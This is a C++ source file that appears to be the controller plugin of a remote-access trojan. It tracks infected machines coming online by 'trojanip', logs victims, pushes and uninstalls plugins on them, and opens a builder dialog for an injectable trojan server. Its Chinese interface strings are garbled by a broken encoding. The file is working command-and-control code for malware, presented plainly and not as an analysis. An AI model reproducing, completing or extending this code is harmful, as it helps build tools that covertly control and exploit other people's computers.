// MasterPlugin.cpp: implementation of the MasterPlugin class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MasterPlugin.h"
#include "macro.h"
#include "conn.h"
#include "CreateInjectServer.h"
#include "TaskbarNotifier.h"
#include <mmsystem.h>

using namespace std;

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

STANDARDDATA	g_StandardData;
vector<string>	allClientIPs;

//CTaskbarNotifier m_wndTaskbarNotifier1;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

MasterPlugin::MasterPlugin():m_pObjViewPane(NULL), m_pOutputPane(NULL)
{
	strcpy(m_plugInfo.sAuthor, "greatyao");
	strcpy(m_plugInfo.sName, "�ܿز��");
	strcpy(m_plugInfo.sDesc, "�ṩĿ�������Ȼ�������");
	m_plugInfo.uReserved = 0x0100;
}

MasterPlugin::~MasterPlugin()
{

}

void MasterPlugin::OnCommand(UINT resId)
{
	if (resId == GetMinResId() + 1 || resId == GetMinResId() + 2)
		ISite::ShowDockPane(resId);
	else if(resId == GetMinResId() + 3)
		MakeInjectFile();
}

void MasterPlugin::OnNotify(UINT id, WPARAM wp, LPARAM lp)
{
	if(wp == NULL)	return;

	switch(id)
	{
	case ZCM_SEL_OBJ:
		{
			STANDARDDATA* info = (STANDARDDATA*)wp;
			memcpy(&g_StandardData, info, sizeof(*info));
		}
		break;

	case ZCM_NEW_ONLINE:
		{
			STANDARDDATA* info = (STANDARDDATA*)wp;
			m_pObjViewPane->InsertItem(info);
			sndPlaySoundA("incoming.wav", SND_ASYNC);
			
			CString addr1 = ISite::GetIPAddrPort(info->trojanip, info->port);
			CString addr2 = ISite::GetRealAddr(info);
			
			if(!addr2.IsEmpty())	addr2 = "������: " + addr2;
			ISite::WriteLog("%s ���� %s", addr1, addr2);
		}
		break;
	case ZCM_WM_DESCRIPTION:
		{
			STANDARDDATA* info = (STANDARDDATA*)wp;
			m_pObjViewPane->ChangeText(info);
		}
		break;

	case ZCM_WM_OFFLINE:
		{			
			STANDARDDATA* info = (STANDARDDATA*)wp;
			m_pObjViewPane->RemoveItem(info);
			ISite::WriteLog("%s ����", ISite::GetIPAddrPort(info->trojanip, info->port));
		}
		break;

	case ZCM_RECV_MSG:
		{
			DispatchData* data = (DispatchData*)wp;
			control_header* header = data->recvData.header;
			unsigned short cmd = header->command;
			unsigned short resp = header->response;
			ProcessResp(cmd, resp, data->recvData.body);
			break;
		}
	}
}

BOOL MasterPlugin::OnInitalize()
{
	return TRUE;
}

BOOL MasterPlugin::OnUninitalize()
{
	if (m_pObjViewPane)
	{
		delete m_pObjViewPane;
		m_pObjViewPane = NULL;
	}
	if (m_pOutputPane)
	{
		delete m_pOutputPane;
		m_pOutputPane = NULL;
	}

	return TRUE;
}

void MasterPlugin::ProcessResp(unsigned short cmd, unsigned short resp, void* body)
{
	if(cmd  >= CONTROL_ENUM_DISKS)	return;

	if(cmd == CONTROL_UPDATE)
	{
		char* dll = (char*)body;
		if(resp == 0)
			ISite::WriteLog("�ϴ����%s�ɹ�",  dll);
		else 
			ISite::WriteLog("�ϴ����%sʧ�ܣ�����ԭ��%d",  dll, resp);
	}
	else if(cmd == CONTROL_UNINSTALL)
	{
		char* dll = (char*)body;
		if(resp == 0)
			ISite::WriteLog("ж�ز��%s�ɹ�",  dll);
		else 
			ISite::WriteLog("ж�ز��%sʧ�ܣ�����ԭ��%d",  dll, resp);

	}
}

void MasterPlugin::OnCreateFrameMenu(CMenu *pMenu)
{
	pMenu->GetSubMenu(2)->AppendMenu(MF_STRING,GetMinResId() + 3, "���÷����");
}

void MasterPlugin::OnCreateFrameToolBar(ToolBarData *pArr, UINT &count)
{
	pArr->uIconId = IDB_BITMAPBUILD;
	pArr->uId = GetMinResId() + 3;
	strcpy(pArr->sName, "���÷����");
	strcpy(pArr->sTip, "���ɿ�ע���ľ�������");

	count = 1;
}

void MasterPlugin::OnCreateDockPane(DockPane *pArr, UINT &count)
{
	if(!m_pObjViewPane)
		m_pObjViewPane = new CObjViewPane();
	
	if (!m_pOutputPane)
		m_pOutputPane = new COutputPane();

	strcpy(pArr->sName, "Ŀ�괰��");
	pArr->uIconId = 2;
	pArr->uId = GetMinResId() + 1;
	pArr->direct = DockLeft;
	pArr->pWnd = m_pObjViewPane;
	pArr->rect = CRect(0,0,230,150);

	pArr++;
	strcpy(pArr->sName, "�������");
	pArr->uIconId = 3;
	pArr->uId = GetMinResId() + 2;
	pArr->pWnd = m_pOutputPane;
	pArr->direct =  DockBottom;

	count = 2;
}

void MasterPlugin::OnCreateDocTemplate()
{

}

void MasterPlugin::OnCommandUI(CCmdUI* pCmdUI)
{

}


CObjViewPane* MasterPlugin::GetObjViewPane()
{
	return m_pObjViewPane;
}

COutputPane* MasterPlugin::GetOutputPane()
{
	return m_pOutputPane;
}

void MasterPlugin::MakeInjectFile()
{
	CCreateInjectServer dlg;
	dlg.DoModal();
}

void MasterPlugin::ShowTrojanOnlineMsgPop(const char* msg)
{
	//m_wndTaskbarNotifier1.Show(msg);
}